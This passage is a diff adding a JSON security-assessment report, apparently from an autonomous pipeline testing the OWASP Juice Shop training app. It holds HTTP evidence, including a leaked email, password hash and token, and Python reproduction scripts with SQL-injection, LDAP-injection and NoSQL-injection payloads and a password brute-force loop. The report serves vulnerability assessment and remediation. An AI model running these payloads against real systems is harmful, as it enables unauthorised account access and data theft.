+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/admin/application-version\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/admin/application-version\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"content-length\": \"20\", \"etag\": \"W/\\\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\\\"\", \"vary\": \"Accept-Encoding\", \"date\": \"Thu, 03 Sep 2026 21:59:28 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\"}, \"body\": \"{\\\"version\\\":\\\"17.1.1\\\"}\", \"truncated\": false, \"redirect_to\": null}",
+          "note": "VERDICT: PROVEN \u2014 The endpoint /rest/admin/application-version discloses the application version \"17.1.1\" which is sensitive information that could be used by an attacker to identify vulnerabilities s",
+          "captured_at": "2026-09-03T21:59:29.342793"
+        }
+      ]
+    },
+    {
+      "id": "W-035",
+      "title": "Information Disclosure",
+      "asset": "/rest/continue-code",
+      "severity": "medium",
+      "cvss_score": 5.0,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1592"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/continue-code\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\", \"cookie\": \"language=en\", \"referer\": \"http://juice-shop:3000/\", \"user-agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/continue-code\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"content-length\": \"79\", \"etag\": \"W/\\\"4f-6FhMg4H2SSdviEYbgMV/q+FgUzg\\\"\", \"vary\": \"Accept-Encoding\", \"date\": \"Thu, 03 Sep 2026 22:02:04 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\"}, \"body\": \"{\\\"continueCode\\\":\\\"aj4QDO4KyOqPJ7j2novp9EQ38gYVAJlGM1wWxalND5reZRLzmXk6BbmzZRb3\\\"}\", \"truncated\": false, \"redirect_to\": null}",
+          "note": "VERDICT: PROVEN \u2014 The /rest/continue-code endpoint discloses a sensitive continue code in the response body when accessed via GET request.",
+          "captured_at": "2026-09-03T22:02:04.803017"
+        }
+      ]
+    },
+    {
+      "id": "W-060",
+      "title": "Sensitive data exposure",
+      "asset": "/rest/memories/",
+      "severity": "medium",
+      "cvss_score": 5.0,
+      "cvss_vector": "",
+      "confirmed": true,
+      "status": "confirmed exploitable (1 proof(s))",
+      "technique_ids": [
+        "T1213"
+      ],
+      "owasp_category": "",
+      "recommendation": "Confirmed via 1 attempt(s).",
+      "effort": "medium",
+      "evidence": [
+        {
+          "request": "http_request {\"url\": \"http://juice-shop:3000/rest/memories/\", \"method\": \"GET\", \"headers\": {\"accept\": \"application/json, text/plain, */*\"}}",
+          "response": "{\"url\": \"http://juice-shop:3000/rest/memories/\", \"status_code\": 200, \"headers\": {\"access-control-allow-origin\": \"*\", \"x-content-type-options\": \"nosniff\", \"x-frame-options\": \"SAMEORIGIN\", \"feature-policy\": \"payment 'self'\", \"x-recruiting\": \"/#/jobs\", \"content-type\": \"application/json; charset=utf-8\", \"etag\": \"W/\\\"1822-ab8aKUqu/jO40buBHoaqkVtrBUg\\\"\", \"vary\": \"Accept-Encoding\", \"content-encoding\": \"gzip\", \"date\": \"Thu, 03 Sep 2026 22:04:14 GMT\", \"connection\": \"keep-alive\", \"keep-alive\": \"timeout=5\", \"transfer-encoding\": \"chunked\"}, \"body\": \"{\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"UserId\\\":13,\\\"id\\\":1,\\\"caption\\\":\\\"\\ud83d\\ude3c #zatschi #whoneedsfourlegs\\\",\\\"imagePath\\\":\\\"assets/public/images/uploads/\\ud83d\\ude3c-#zatschi-#whoneedsfourlegs-1572600969477.jpg\\\",\\\"createdAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"User\\\":{\\\"id\\\":13,\\\"username\\\":\\\"\\\",\\\"email\\\":\\\"bjoern@owasp.org\\\",\\\"password\\\":\\\"9283f1b2e9669749081963be0462e466\\\",\\\"role\\\":\\\"deluxe\\\",\\\"deluxeToken\\\":\\\"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4\\\",\\\"lastLoginIp\\\":\\\"\\\",\\\"profileImage\\\":\\\"assets/public/images/uploads/13.jpg\\\",\\\"totpSecret\\\":\\\"\\\",\\\"isActive\\\":true,\\\"createdAt\\\":\\\"2026-09-03T22:01:21.492Z\\\",\\\"updatedAt\\\":\\\"2026-09-03T22:01:21.492Z\\\",\\\"deletedAt\\\":null}},{\\\"UserId\\\":4,\\\"id\\\":2,\\\"caption\\\":\\\"Magn(et)ificent!\\\",\\\"imagePath\\\":\\\"assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg\\\",\\\"createdAt\\\":\\\"2026-09-03T22:01:22.986Z\\\",\\\"updatedAt\\\":\\\"2026-09",
+          "note": "VERDICT: PROVEN \u2014 The endpoint GET /rest/memories/ exposes sensitive user data including email addresses and password hashes without requiring authentication.",
+          "captured_at": "2026-09-03T22:04:15.067864"
+        }
+      ]
+    }
+  ],
+  "playbook": {
+    "scripts": [
+      {
+        "weakness_id": "W-002",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\nresponse = requests.get(url)\nif response.status_code == 200 and 'config' in response.text.lower():\n    print('W-002 reproduced: Accessible admin configuration endpoint')\nelse:\n    print('W-002 not reproduced')",
+        "description": "Attempts to access the admin configuration endpoint without authentication to verify IDOR.",
+        "technique_ids": [
+          "T1213"
+        ],
+        "remediation_pointer": "Implement proper access controls and ensure admin endpoints are protected.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-005",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\nresponse = requests.get(url)\nif response.status_code == 200 and ('error' in response.text.lower() or 'stack trace' in response.text.lower()):\n    print('W-005 reproduced: Verbose error messages exposing internal details')\nelse:\n    print('W-005 not reproduced')",
+        "description": "Checks if accessing admin config returns verbose internal error information.",
+        "technique_ids": [
+          "T1592"
+        ],
+        "remediation_pointer": "Disable detailed error reporting in production and sanitize all error responses.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-009",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-version\"\nresponse = requests.get(url)\nif response.status_code == 200 and 'version' in response.text.lower():\n    print('W-009 reproduced: Application version exposed')\nelse:\n    print('W-009 not reproduced')",
+        "description": "Verifies exposure of application version which can aid attackers in targeting known exploits.",
+        "technique_ids": [
+          "T1592"
+        ],
+        "remediation_pointer": "Avoid exposing version numbers in responses; use generic messages instead.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-010",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-version\"\nresponse = requests.get(url)\nif response.status_code == 200:\n    print('W-010 reproduced: Unprotected admin endpoint accessible')\nelse:\n    print('W-010 not reproduced')",
+        "description": "Tests accessibility of an admin-only version endpoint without requiring credentials.",
+        "technique_ids": [
+          "T1548"
+        ],
+        "remediation_pointer": "Enforce role-based access control on administrative endpoints.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-020",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/products/search?q[$where]=this.title.includes('a')\"\nresponse = requests.get(url)\nif response.status_code == 200 and 'products' in response.text.lower():\n    print('W-020 reproduced: NoSQL injection possible via search parameter manipulation')\nelse:\n    print('W-020 not reproduced')",
+        "description": "Demonstrates potential NoSQL injection by injecting MongoDB operators into a search field.",
+        "technique_ids": [
+          "T1190"
+        ],
+        "remediation_pointer": "Sanitize and validate user inputs strictly; avoid passing raw input to database queries.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-035",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/continue-code\"\nresponse = requests.get(url)\nif response.status_code == 200 and 'code' in response.text.lower():\n    print('W-035 reproduced: Sensitive continue code leaked via API endpoint')\nelse:\n    print('W-035 not reproduced')",
+        "description": "Accesses the continue-code endpoint which should be restricted, potentially revealing codes.",
+        "technique_ids": [
+          "T1592"
+        ],
+        "remediation_pointer": "Restrict sensitive endpoints using authorization checks.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-038",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nlogin_url = f\"{target}/rest/user/login\"\n# Inject SQL into email parameter\npayload = {'email': \"admin@juice-sh.op'--\", 'password': 'anything'}\nresponse = requests.post(login_url, json=payload)\nif response.status_code == 200:\n    print('W-038 reproduced: Likely SQL Injection success in login form')\nelse:\n    print('W-038 not reproduced')",
+        "description": "Exploits a potential SQLi vulnerability in email field during login attempt.",
+        "technique_ids": [
+          "T1190"
+        ],
+        "remediation_pointer": "Use parameterized queries and robust input validation for all DB interactions.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-044",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nlogin_url = f\"{target}/rest/user/login\"\npayload = {'email': '*)(uid=*))(|(mail=*', 'password': 'anything'}\nresponse = requests.post(login_url, json=payload)\nif response.status_code == 200:\n    print('W-044 reproduced: LDAP Injection successful')\nelse:\n    print('W-044 not reproduced')",
+        "description": "Tests for LDAP injection by crafting malicious payload in email field that modifies LDAP query structure.",
+        "technique_ids": [
+          "T1190"
+        ],
+        "remediation_pointer": "Sanitize special LDAP characters in user-provided inputs used in directory searches.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-045",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nlogin_url = f\"{target}/rest/user/login\"\ncount = 0\ncommon_passwords = ['password', '123456', 'qwerty']\nfor pwd in common_passwords:\n    payload = {'email': 'admin@juice-sh.op', 'password': pwd}\n    resp = requests.post(login_url, json=payload)\n    count += 1\n    if resp.status_code == 200 or count >= len(common_passwords):\n        break\nif resp.status_code == 200:\n    print('W-045 reproduced: Login brute force may succeed with simple passwords')\nelse:\n    print('W-045 not reproduced')",
+        "description": "Performs basic brute-force attacks on login endpoint using simple password guesses.",
+        "technique_ids": [
+          "T1110.001"
+        ],
+        "remediation_pointer": "Implement account lockout policies and CAPTCHA after failed attempts.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      },
+      {
+        "weakness_id": "W-050",
+        "language": "python",
+        "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nfeedback_url = f\"{target}/api/Feedbacks/1\"\nresponse = requests.get(feedback_url)\nif response.status_code == 200 and '_id' in response.json():\n    print('W-050 reproduced: Unauthorized feedback record access (IDOR)')\nelse:\n    print('W-050 not reproduced')",
+        "description": "Accesses specific feedback resource directly by ID bypassing intended access restrictions.",
+        "technique_ids": [
+          "T1213"
+        ],
+        "remediation_pointer": "Ensure object-level permissions are enforced when retrieving resources by ID.",
+        "safety_checked": true,
+        "safety_notes": "passed static safety check (pattern denylist)"
+      }
+    ],
+    "rejected": 0
+  },
+  "attack_coverage": {
+    "T1110.001": [
+      "W-045"
+    ],
+    "T1190": [
+      "W-020",
+      "W-038",
+      "W-044",
+      "W-056",
+      "W-059"
+    ],
+    "T1213": [
+      "W-002",
+      "W-050",
+      "W-060"
+    ],
+    "T1548": [
+      "W-010"
+    ],
+    "T1592": [
+      "W-005",
+      "W-009",
+      "W-035"
+    ]
+  },
+  "exploitation_confirmed": true,
+  "caveats": [
+    "Produced by an autonomous pipeline with no human review. Findings should be validated by a security engineer before remediation is prioritised or the results are shared externally.",
+    "Only proven findings are listed. Of 61 candidate weakness(es), 61 were tested for exploitability and 13 were proven; the remainder are hypotheses and are not reported as findings.",
+    "The crawl hit a configured limit after 5 pages, so the asset map is a lower bound and parts of the application were never seen.",
+    "Absence of a finding is not evidence of absence. This engagement covered what the crawler reached within its configured bounds."
+  ]
+}
